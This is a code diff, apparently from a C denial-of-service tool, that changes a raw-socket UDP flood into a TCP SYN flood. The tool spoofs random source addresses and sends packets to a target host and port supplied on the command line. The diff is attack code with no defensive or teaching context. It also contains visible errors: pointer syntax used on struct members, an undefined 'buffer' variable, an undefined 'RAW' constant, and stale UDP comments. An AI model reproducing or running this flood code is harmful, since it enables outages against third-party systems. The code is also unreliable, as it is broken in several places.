@@ -14,6 +14,8 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <netinet/ip_icmp.h>
 #include <pthread.h>
 
@@ -22,15 +24,15 @@
 #define DATUML (3*K)
 
 static unsigned long dest = 0;
-static int PROTO_UDP = -1;
+static int PROTO_TCP = -1;
 static int alive = -1;
 static int rawsock;
-static int dest_port = 80;
+static unsigned short dest_port = 0;
 
 static inline long myrandom(int begin,int end);
 static unsigned short dos_cksum(unsigned short *data,int length);
 static void dos_fun(unsigned long ip);
-static void dos_udp(void);
+static void dos_syn(void);
 static void * dos_sig(int signo);
 
 
@@ -72,21 +74,21 @@ static unsigned short dos_cksum(unsigned short *data,int length){
 /*多线程函数*/
 static void dos_fun(unsigned long ip){
 	while(alive){
-		dos_udp();
+		dos_syn();
 	}
 }
 
-static void dos_udp(){
+static void dos_syn(){
 	/*数据长度*/
-	int tot_len = sizeof(struct ip)+sizeof(struct udphdr)+DATUML;
+	int tot_len = sizeof(struct ip)+sizeof(struct tcphdr)+DATUML;
 	/*发送目的地址*/
 	struct sockaddr_in to;
 
 	/*Dos结构，分为ip头部，udp头部，udp数据部分*/
 	struct dosseg_t{
 		struct ip iph;
-		struct udphdr udph;
-		unsigned char data[65535];
+		struct tcphdr tcph;
+		unsigned char data[8192];
 	} dosseg;
 	dosseg.iph->ip_v = 4;
 	dosseg.iph->ip_hl = 5;
@@ -94,34 +96,28 @@ static void dos_udp(){
 	dosseg.iph->ip_len = htons(tot_len);
 	dosseg.iph->ip_id = htons(getpid());
 	dosseg.iph->ip_off = 0;
-	dosseg.iph->ip_ttl = myrandom(200,255);
-	dosseg.iph->ip_p = PROTO_UDP;
+	dosseg.iph->ip_ttl = myrandom(128,255);
+	dosseg.iph->ip_p = PROTO_TCP;
 	dosseg.iph->ip_sum = 0;
 	dosseg.iph->ip_src = (unsigned long) myrandom(0,65535);
 	dosseg.iph->ip_dst = dest;
-	dosseg.iph->ip_sum = dos_cksum((u16 *)dosseg.iph,sizeof(dosseg.iph));
 
-#ifdef __FAVOR_BSD
-	/*udp*/
-	dosseg.udph.uh_sport = (unsigned long)myrandom(0,65535);
-	dosseg.udph.uh_dport = dest_port;
-	dosseg.udph.uh_ulen = htons(sizeof(dosseg.udph)+DATUML);
-	dosseg.udph.uh_sum = 0;
-	dosseg.udph.uh_sum = dos_cksum((u16 *)&dosseg.udph,tot_len);
-#else
-	/*udp*/
-	dosseg.udph.source = (unsigned long)myrandom(0,65535);
-	dosseg.udph.dest = dest_port;
-	dosseg.udph.len = htons(sizeof(dosseg.udph)+DATUML);
-	dosseg.udph.check = 0;
-	dosseg.udph.check = dos_cksum((u16 *)&dosseg.udph,tot_len);
-#endif
+	dosseg.tcph.seq = htonl((unsigned long) myrandom(0,65535));
+	dosseg.tcph.ack_seq = htons(myrandom(0,65535));
+	dosseg.tcph.syn = 1;
+	dosseg.tcph.urg = 1;
+	dosseg.tcph.window = htons(myrandom(0,65535));
+	dosseg.tcph.check = 0;
+	dosseg.tcph.urg_ptr = htons(myrandom(0,65535));
+	dosseg.tcph.check = dos_cksum((u16 *)buffer,(sizeof(struct ip) +sizeof(struct tcphdr) +1) & ~1);
+	dosseg.iph.ip_sum = dos_cksum((u16 *)buffer,(4* dosseg.iph.ip_hl +sizeof(struct tcphdr) +1) & ~1);
+	
 	/*填写发送目的地址*/
 	to.sin_family = AF_INET;
 	to.sin_addr.s_addr = dest;
 	to.sin_port = htons(0);
 	/*发送数据*/
-	sendto(rawsock,&dosseg,tot_len,0,(struct sockaddr *)&to,sizeof(struct sockaddr));
+	sendto(rawsock,&dosseg,4*dosseg.iph.ip_hl+sizeof(struct tcphdr),0,(struct sockaddr *)&to,sizeof(struct sockaddr));
 }
 
 
@@ -149,7 +145,7 @@ int main(int argc,char *argv[]){
 		return -1;
 	}
 
-	PROTO_ICMP = protocol->p_proto;
+	PROTO_TCP = protocol->p_proto;
 
 	dest = inet_addr(argv[1]);
 	if(dest == INADDR_NONE){
@@ -162,9 +158,10 @@ int main(int argc,char *argv[]){
 		memcpy((char *)&dest,host->h_addr.s_addr,host->h_length);
 	}
 	dest_port = atoi(argv[2]);
+
 	rawsock = socket(AF_INET,SOCK_RAW,RAW);//建立原始socket
 	if(rawsock <0){
-		rawsock = socket(AF_INET,SOCK_RAW,IPROTO_UDP);
+		rawsock = socket(AF_INET,SOCK_RAW,PROTO_TCP);
 	}
 	setsockopt(rawsock,SOL_IP,IP_HDRINCL,"1",sizeof("1"));
 	//设置ip
